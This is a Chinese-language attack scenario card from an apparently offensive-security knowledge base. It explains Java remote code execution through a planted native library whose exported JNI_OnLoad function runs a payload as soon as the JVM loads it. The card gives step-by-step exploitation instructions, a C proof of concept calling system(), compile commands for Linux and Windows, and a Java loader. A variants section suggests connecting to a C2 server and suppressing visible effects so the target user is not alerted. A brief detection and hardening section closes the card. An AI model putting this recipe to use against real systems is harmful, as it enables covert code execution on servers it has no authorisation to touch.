---
id: web-java-rce-jni-onload-export-load-time-exec
title: JNI_OnLoad 导出符号：JVM 加载原生库时主动调用，无需任何 Java_ 方法即执行
type: scenario
domain: web
path: web/java/rce
technique: jni-onload-export-load-time-execution
aliases:
- JNI_OnLoad 执行命令
- JNI_OnLoad 载入期执行
- JNI_VERSION_1_8 返回
- 加载库即执行 JNI_OnLoad
- JNI_OnLoad system 调用
tags:
- java
- jni
- jni-onload
- native-library
- system-load
- load-time
- payload
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-08T00:19:24+08:00'
  notes: 已对照 content.md(313 行)与 img/03 核对：JNI_OnLoad 段 C 代码（JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM*, void*) 内 system("calc") 后 return JNI_VERSION_1_8）与卡内 PoC 一致；img/03 为 IDE 中 Exp.java 仅 static{ System.loadLibrary("libcmd"); } + 空 main，运行后弹出计算器（JDK 17），与卡内「加载即执行、无需调用方法」一致。已修正事实错误：原合并卡称「库内代码没有子进程创建、exec 审计不会命中」，但该段载荷实为 system()，会 fork/execve 起子进程；现已改为「不经过 Java 层 Runtime/ProcessBuilder 的 RASP hook，但 native 层仍有子进程痕迹」，并同步修正检测条。受影响版本不适用（JDK 版本一致性属环境前提）。未在本机编译/加载任何 so/dll。
---

## 一句话结论

JVM 在 `dlopen`/`LoadLibrary` 加载原生库后会主动查找可选导出符号 `JNI_OnLoad(JavaVM*, void*)` 并调用它；攻击者只要导出一个 `JNI_OnLoad`、在函数体内执行载荷并返回 `JNI_VERSION_1_8`，就能在库被 `System.loadLibrary` / `System.load` 加载的那一刻执行代码，无需实现任何 `Java_<Class>_<method>` 符号，也无需目标类声明过对应 `native` 方法。

## 原理

- `JNI_OnLoad` 是 JNI 规范定义的可选入口：JVM 加载库后先解析该符号，存在则调用，用它完成 `RegisterNatives` 等初始化，返回值是库所支持的 JNI 版本（`JNI_VERSION_1_6`/`JNI_VERSION_1_8` 等常量）。返回非版本常量会被 JVM 视为初始化失败并抛错，但**函数体本身已经执行完**，载荷已经生效。
- 该调用发生在 JVM 返回给 Java 侧 `System.loadLibrary` 之前，早于任何 `native` 方法解析（`Java_` 符号查找/`RegisterNatives`），因此不需要目标应用里存在匹配的 `native` 方法声明。
- 它的调用时机由 JVM 保证、与导出符号名绑定，是所有平台通用的入口（Linux `.so` 与 Windows `.dll` 同符号），适合作为跨平台载荷的统一入口。
- 载荷在 JVM 进程内执行，因此直接用 `system()`/`execl()` 之类的 libc 调用即可；这类调用仍会在 native 层 `fork`/`execve` 产生子进程（用 `system("calc")` 会拉起子进程），只是不经过 Java 层 `Runtime`/`ProcessBuilder` 的 RASP hook。
- 与 `__attribute__((constructor))`/`DllMain` 的区别：那两个是编译器/操作系统层面的载入期入口（GCC 扩展、PE 入口点），与 JNI 无关；`JNI_OnLoad` 由 JVM 显式调用，因此在「只知道目标 JVM 会 load 某个文件、但不确定平台」时最通用。

## 触发条件

- 目标 JVM 存在可控的原生库加载点：`System.loadLibrary(可控名)`、`System.load(可控绝对路径)`、JNA/框架解包加载，或能把文件写进 `java.library.path` 并触发加载的上传/任务/反序列化入口。
- 攻击者能把编译好的库落地到目标机，架构/位数与目标 JVM 匹配（Windows 的 `.dll` 与 Linux 的 `.so` 不可互换）。
- 编译时用的是与目标一致的 JDK 头文件目录（`-I $JAVA_HOME/include` 加平台子目录），否则 `jni.h` 类型不匹配。
- 目标进程对落地的库有读权限；未用 `SecurityManager` 限制 `System.load`。

## 利用步骤

1. 确认加载点与 `java.library.path` 实际值（`System.getProperty("java.library.path")`、启动脚本、容器挂载目录）。
2. 写一个只含 `JNI_OnLoad` 的 C 文件：签名 `JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved)`，体内执行载荷，末尾 `return JNI_VERSION_1_8;`。
3. 按目标平台与 JDK 版本编译共享库：Linux `gcc -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so onload.c`；Windows 用 `include\win32` 并输出 `.dll`。
4. 把库落地到加载点可读位置；走 `loadLibrary` 时文件名需符合 `lib<name>.so`/`<name>.dll` 且落在 `java.library.path` 内。
5. 触发加载（`System.loadLibrary("cmd")`、反射 `System.load(path)`、静态代码块、JNA 初始化），不调用任何方法也会执行。
6. 观察副作用（弹窗、marker 文件、命令输出）确认执行，随后清理库文件。

## PoC

```c
#include <stdlib.h>
#include <jni.h>

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    system("calc");            // Windows；Linux 可换成 system("id") 或 execl(...)
    // system("touch /tmp/jni-onload-ok");
    return JNI_VERSION_1_8;    // 返回版本常量，JVM 认为初始化成功
}
```

```bash
# Linux
gcc -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so onload.c
# Windows（MinGW）
gcc -fPIC -I "%JAVA_HOME%\include" -I "%JAVA_HOME%\include\win32" -shared -o cmd.dll onload.c
```

```java
public class LoadOnly {
    static {
        System.loadLibrary("cmd");   // 或 System.load("/abs/path/libcmd.so")
    }
    public static void main(String[] args) { }
}
```

```text
# 预期：main 为空，但类初始化触发 loadLibrary 时即弹出计算器/生成 marker
```

## 变体与关联

- 变体：`JNI_OnLoad` 里顺带调用 `RegisterNatives`，把后续 `native` 方法登记到自己的实现上，加载即可执行、之后还能被 Java 侧正常调用（便于二次交互）。
- 变体：载荷改成读配置文件、连 C2、写 marker；不弹窗以避免惊动目标用户。
- 关联：`[[web-java-rce-elf-constructor-load-time-exec]]`（ELF 编译器层入口）、`[[web-java-rce-windows-dllmain-load-time-exec]]`（PE 入口点入口）是同一次「加载即执行」的另两种形态；`[[web-java-rce-job-invoketarget-whitelist-suffix-system-load-so]]` 解决「怎么让应用调用 System.load」。
- 边界：目标禁止原生库加载、库架构/位数不匹配、`java.library.path` 不可写且没有可带绝对路径的加载点、容器只读文件系统时失败。

## 检测与防御

- 检测：JVM 进程 `dlopen`/`LoadLibrary` 的目标路径不在应用依赖目录；`/proc/<pid>/maps` 出现非常规 `lib*.so`；加载后立即出现子进程（`system()` 会拉起 shell/calc）或外连 socket。
- 检测：`java.library.path` 或加载参数含用户可控内容；上传接口出现 `.so`/`.dll` 且随后被进程加载。
- 修复：不要用用户可控字符串做 `System.load`/`System.loadLibrary`；原生能力改为固定白名单文件、服务端预置、哈希/签名校验后再加载。
- 加固：`java.library.path` 指向只读目录；上传目录与服务运行目录分离；以低权限账号运行 JVM；审计 `dlopen` 路径与子进程创建。
